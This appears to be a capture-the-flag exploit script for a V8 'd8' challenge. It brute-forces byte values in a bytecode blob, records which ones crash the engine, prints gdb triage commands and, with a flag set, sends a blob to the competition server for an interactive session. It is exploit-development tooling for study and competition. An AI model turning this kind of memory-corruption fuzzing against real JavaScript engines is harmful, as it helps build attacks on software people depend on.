#!/usr/bin/env python3
import os
import shutil

from pwn import *
from pathlib import Path
from subprocess import check_output, CalledProcessError, STDOUT


HOST, PORT = "d8.2022.ctfcompetition.com 1337".split()

blobpath = Path("blob.bin")
debug = args.D
build, run = ["dbuild", "debug"] if debug else ["rbuild", "release"]

try:
    if blobpath.is_file():
        os.remove(blobpath)
    output = check_output(["./d8.sh", build, "--print-bytecode"])
except CalledProcessError as e:
    print(e.output)

with open(blobpath, "rb") as blobfile:
    blobdata = blobfile.read()

shutil.copyfile(blobpath, "blob.bin.bak")

pattern = b"\x79\x00\x00\x04" # ???

index = blobdata.find(pattern)

# oob = 0x3b if args.D else 0x3a
trials_rng = range(0, 255)
if args.OOB:
    trials_rng = [int(args.OOB, 0)]
trials = list()
for trial in trials_rng:
    exp = b"\x79" + trial.to_bytes(1, "big") + trial.to_bytes(1, "big") + b"\x04"
    payload = blobdata[:index] + exp + blobdata[index+len(exp):]
    tempblob = Path(f"blobs/blob{trial}.bin")
    with open(tempblob, "wb") as blobfile:
        blobfile.write(payload)
    shutil.copyfile(tempblob, blobpath)
    try:
        print(trial, end=": ")
        if not args.REMOTE:
            output = check_output(["./d8.sh", run], stderr=STDOUT)
            print(output.decode())
    except CalledProcessError as e:
        if b"Segmentation fault" in e.output:
            trials.append(trial)
            print("SEGFAULT", end=' ')
        print("exception")
        if args.OOB:
            print(e.output.decode())

trials_str = str(trials).replace(" ", "")[1:-1]
print("V8_DIR=/opt/v8/v8/out")
print("for IDX in {"+trials_str+"}; do gdb -ex=r -x script.gdb --args $V8_DIR/debug/challenge blobs/blob$IDX.bin --; done")

if args.REMOTE:
    io = remote(HOST, PORT)
    with open(blobpath, "rb") as blobfile:
        blobdata = blobfile.read()
    io.sendlineafter(b"size:", str(len(blobdata)).encode())
    io.sendlineafter(b"data:", blobdata)
    io.interactive()
